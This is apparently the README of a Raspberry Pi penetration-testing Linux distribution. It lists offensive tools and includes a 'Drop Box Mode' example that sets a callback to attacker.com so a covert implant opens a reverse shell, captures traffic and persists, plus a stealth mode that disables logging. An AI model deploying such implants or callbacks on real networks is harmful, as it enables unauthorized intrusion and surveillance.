<div align="center">

# 🥧 NullSec Linux Pi Edition

[![Version](https://img.shields.io/badge/Version-1.0.0-58a6ff?style=for-the-badge)](https://github.com/bad-antics/nullsec-linux-pi)
[![Platform](https://img.shields.io/badge/Platform-Raspberry_Pi-A22846?style=for-the-badge&logo=raspberrypi&logoColor=white)](https://www.raspberrypi.org/)
[![License](https://img.shields.io/badge/License-GPL--3.0-3fb950?style=for-the-badge)](LICENSE)

**Security-focused Linux distribution optimized for Raspberry Pi**

*Portable penetration testing • IoT security • Embedded hacking • Field operations*

[Features](#features) • [Download](#download) • [Installation](#installation) • [Tools](#tools) • [Documentation](#documentation)

</div>

---

## 🎯 Overview

NullSec Linux Pi Edition is a specialized security distribution designed for Raspberry Pi hardware. It transforms your Pi into a powerful, portable penetration testing platform with optimized ARM tools, GPIO security utilities, and field-ready capabilities.

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🔧 **ARM-Optimized Tools** | 80+ security tools compiled for ARM64/ARMv7 |
| 📡 **WiFi Attacks** | Monitor mode drivers, aircrack-ng suite, WiFi Pineapple integration |
| 🔌 **GPIO Security** | Hardware hacking tools, JTAG/SWD debugging, signal analysis |
| 🎭 **Stealth Mode** | MAC spoofing, traffic obfuscation, covert channels |
| 📱 **Mobile Integration** | Android/iOS testing, Bluetooth attacks, NFC tools |
| 🔋 **Power Optimized** | Battery-friendly profiles, headless operation |
| 🖥️ **Multiple Modes** | Desktop, headless server, kiosk, drop box |

## ��️ Supported Hardware

| Device | Status | Notes |
|--------|--------|-------|
| Raspberry Pi 5 | ✅ Full Support | Recommended |
| Raspberry Pi 4B | ✅ Full Support | 4GB+ RAM recommended |
| Raspberry Pi 400 | ✅ Full Support | Built-in keyboard |
| Raspberry Pi 3B+ | ⚠️ Limited | Reduced toolset |
| Raspberry Pi Zero 2W | ⚠️ Limited | Headless only |

## 📦 Editions

### 🔥 Full Edition (~4GB)
Complete security toolkit with GUI, all tools, and development environment.

### ⚡ Lite Edition (~2GB)
Headless operation with essential tools for field deployment.

### 🎯 Drop Box Edition (~1.5GB)
Minimal footprint for covert network implants with auto-callback.

## 🛠️ Pre-installed Tools

<details>
<summary><b>🌐 Network Security (25+ tools)</b></summary>

- Nmap, Masscan, Netcat
- Aircrack-ng suite
- Bettercap, Responder
- Wireshark (GUI), tshark
- WiFite2, Wifiphisher
- Kismet, hostapd-wpe

</details>

<details>
<summary><b>🔓 Exploitation (20+ tools)</b></summary>

- Metasploit Framework
- SQLMap, Commix
- Hydra, Medusa
- CrackMapExec
- Impacket suite
- Covenant (C2)

</details>

<details>
<summary><b>🔌 Hardware Hacking (15+ tools)</b></summary>

- OpenOCD (JTAG/SWD)
- flashrom
- SigRok/PulseView
- can-utils (CAN bus)
- I2C/SPI tools
- GPIO manipulation

</details>

<details>
<summary><b>📻 RF & Wireless (15+ tools)</b></summary>

- GNU Radio
- RTL-SDR tools
- HackRF utilities
- Bluetooth tools (Ubertooth)
- NFC tools (libnfc)
- LoRa analysis

</details>

## 🚀 Quick Start

### Flash to SD Card

```bash
# Download image
wget https://github.com/bad-antics/nullsec-linux-pi/releases/latest/download/nullsec-pi-full.img.xz

# Flash (Linux/macOS)
xzcat nullsec-pi-full.img.xz | sudo dd of=/dev/sdX bs=4M status=progress

# Or use Raspberry Pi Imager with custom image
```

### First Boot

```bash
# Default credentials
Username: nullsec
Password: nullsec

# Change password immediately
passwd

# Update tools
sudo nullsec-update
```

## 🎭 Stealth Features

```bash
# Enable full stealth mode
sudo nullsec-stealth enable

# Includes:
# - MAC address randomization
# - Hostname spoofing
# - Traffic obfuscation
# - Logging disabled
# - Memory-only operation

# Disable stealth
sudo nullsec-stealth disable
```

## 📡 Drop Box Mode

Deploy as a covert network implant:

```bash
# Configure callback
sudo nullsec-dropbox config \
  --callback-host attacker.com \
  --callback-port 443 \
  --interval 300 \
  --protocol https

# Enable drop box mode
sudo nullsec-dropbox enable

# Device will:
# - Auto-connect to any open WiFi
# - Establish reverse shell
# - Capture network traffic
# - Persist across reboots
```

## 🔧 GPIO Security Tools

```bash
# JTAG scanning
sudo nullsec-jtag scan

# SWD debugging
sudo nullsec-swd connect --target stm32

# I2C enumeration
sudo nullsec-i2c scan

# SPI flash dump
sudo nullsec-spi dump --output firmware.bin
```

## 📊 System Requirements

| Edition | Storage | RAM | Network |
|---------|---------|-----|---------|
| Full | 16GB+ | 4GB+ | WiFi + Ethernet |
| Lite | 8GB+ | 2GB+ | WiFi |
| Drop Box | 4GB+ | 1GB+ | WiFi |

## 🔗 Related Projects

- [NullSec Linux](https://github.com/bad-antics/nullsec-linux) - Main distribution
- [NullSec Flipper Suite](https://github.com/bad-antics/nullsec-flipper-suite) - Flipper Zero tools
- [NullSec Pineapple Suite](https://github.com/bad-antics/nullsec-pineapple-suite) - WiFi Pineapple payloads

---

<div align="center">

**[bad-antics](https://github.com/bad-antics)** • *For authorized security testing only*

</div>
